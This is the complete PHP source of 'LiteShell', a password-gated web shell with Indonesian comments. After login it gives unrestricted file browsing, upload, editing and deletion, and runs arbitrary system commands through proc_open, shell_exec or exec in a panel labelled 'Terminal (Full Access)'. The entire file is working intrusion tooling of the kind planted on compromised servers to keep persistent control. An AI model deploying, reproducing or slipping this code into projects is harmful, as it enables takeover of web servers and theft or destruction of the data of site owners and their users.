<?php
session_start();

// Password hash (ubah sesuai kebutuhan)
$hashedPassword = '$2a$12$zad1JiWjZwsUyhrE2MLU7OzAeaafRpWUlQ7lhbgIvrVB03WTXrPzu';

// Login
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashedPassword)) {
            $_SESSION['logged_in'] = true;
            header("Location: ".$_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }
    ?>
    <form method="post" style="text-align:center;margin-top:100px;">
        <h2>🔐 Masukkan Password</h2>
        <input type="password" name="password" required>
        <button type="submit">Login</button>
        <?php if(isset($error)) echo "<p style='color:red;'>$error</p>"; ?>
    </form>
    <?php
    exit;
}

// Helpers
function x($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }
function formatSize($bytes){
    if($bytes>=1073741824) return number_format($bytes/1073741824,2).' GB';
    if($bytes>=1048576) return number_format($bytes/1048576,2).' MB';
    if($bytes>=1024) return number_format($bytes/1024,2).' KB';
    return $bytes.' B';
}
function getIcon($path){ return is_dir($path)?'📁':'📄'; }

$currentPath = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if(!is_dir($currentPath)) $currentPath = getcwd();

// Upload file
if(isset($_POST['upload']) && isset($_FILES['file'])){
    move_uploaded_file($_FILES['file']['tmp_name'],$currentPath.DIRECTORY_SEPARATOR.$_FILES['file']['name']);
}

// Create file/folder
if(isset($_POST['create_file'])) file_put_contents($currentPath.DIRECTORY_SEPARATOR.$_POST['name'],'');
if(isset($_POST['create_folder'])) mkdir($currentPath.DIRECTORY_SEPARATOR.$_POST['name']);

// Delete file/folder
if(isset($_POST['delete'])){
    $p = $_POST['delete'];
    if(is_file($p)) unlink($p);
    elseif(is_dir($p)) rmdir($p);
}

// Edit file
if(isset($_POST['edit_file']) && isset($_POST['content'])){
    file_put_contents($_POST['edit_file'], $_POST['content']);
}

// Terminal: Full command execution
$terminalOutput = '';
if(isset($_POST['terminal'])){
    $cmd = $_POST['terminal'];
    if(function_exists('proc_open')){
        $descriptors = [0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];
        $process = proc_open($cmd,$descriptors,$pipes,$currentPath);
        if(is_resource($process)){
            $terminalOutput = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
        } else $terminalOutput = "proc_open tidak bisa digunakan";
    } elseif(function_exists('shell_exec')){
        $terminalOutput = shell_exec($cmd);
    } elseif(function_exists('exec')){
        exec($cmd,$out);
        $terminalOutput = implode("\n",$out);
    } else $terminalOutput = "Tidak ada fungsi eksekusi tersedia";
}

$items = scandir($currentPath);
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>LiteShell</title>
<style>
body{font-family:sans-serif;background:#001f3f;color:#fff;margin:0;padding:20px;}
a{color:#ffcc00;text-decoration:none;}
table{width:100%;border-collapse:collapse;}
th,td{border:1px solid #444;padding:5px;text-align:left;}
th{background:#ffcc00;color:#000;}
tr:nth-child(even){background:#003366;}
tr:nth-child(odd){background:#000;}
textarea{width:100%;height:200px;background:#000;color:#0f0;}
form{margin:0;}
</style>
</head>
<body>

<h2>📂 Directory: <?= x($currentPath) ?></h2>

<h3>Actions</h3>
<form method="POST" enctype="multipart/form-data">
    Upload: <input type="file" name="file" required>
    <button type="submit" name="upload">Upload</button>
</form>

<form method="POST">
    New File: <input type="text" name="name" required>
    <button type="submit" name="create_file">Create</button>
</form>

<form method="POST">
    New Folder: <input type="text" name="name" required>
    <button type="submit" name="create_folder">Create Folder</button>
</form>

<h3>Terminal (Full Access)</h3>
<form method="POST">
    <input type="text" name="terminal" placeholder="Enter command" style="width:80%;" required>
    <button type="submit">Run</button>
</form>
<?php if($terminalOutput): ?>
<pre style="background:#000;color:#0f0;padding:10px;"><?= x($terminalOutput) ?></pre>
<?php endif; ?>

<h3>Files & Folders</h3>
<table>
<tr><th>Name</th><th>Size</th><th>Action</th></tr>
<?php
foreach($items as $item){
    if($item=='.'||$item=='..') continue;
    $path = $currentPath.DIRECTORY_SEPARATOR.$item;
    $size = is_file($path)?formatSize(filesize($path)):'Folder';
    $icon = getIcon($path);
    echo "<tr>";
    echo "<td>$icon ".(is_dir($path)?"<a href='?d=".urlencode($path)."'>".x($item)."</a>":"<a href='?view=".urlencode($path)."'>".x($item)."</a>")."</td>";
    echo "<td>$size</td>";
    echo "<td>
        <form method='POST' style='display:inline;'><input type='hidden' name='delete' value='".x($path)."'><button>Delete</button></form>
    </td>";
    echo "</tr>";
}
?>
</table>

<?php
// Edit file
if(isset($_GET['view']) && is_file($_GET['view'])){
    $f = $_GET['view'];
    $content = file_get_contents($f);
    ?>
    <h3>Editing: <?= x(basename($f)) ?></h3>
    <form method="POST">
        <textarea name="content"><?= x($content) ?></textarea>
        <input type="hidden" name="edit_file" value="<?= x($f) ?>">
        <button type="submit">Save</button>
    </form>
    <?php
}
?>

</body>
</html>